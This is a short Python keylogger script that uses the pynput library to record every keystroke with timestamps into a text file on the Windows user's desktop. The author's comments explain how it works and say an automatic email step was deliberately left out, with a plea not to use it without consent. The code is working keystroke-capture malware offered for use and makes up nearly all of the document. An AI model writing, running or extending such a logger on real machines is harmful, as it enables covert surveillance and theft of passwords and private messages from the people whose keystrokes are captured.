from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile
username = os.getlogin()
logging_directory = f"C:/Users/{username}/Desktop"
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
def key_handler(key):
    logging.info(key)
with Listener(on_press=key_handler) as listener:
    listener.join()
## pynput has a submodule named Listener, listener allows the program to record and trace keystrokes albeit individually.
## This program creates a text file named mylog.txt, if you so wanted to change the file name refer to line 7 and simply change the mylog.txt to whatever your hear desires.
## For the sake of protecting other users I have left out the auto mail client portion of this program, please do not use this program for malicious purposes or without the 3rd party's explicit consent!!
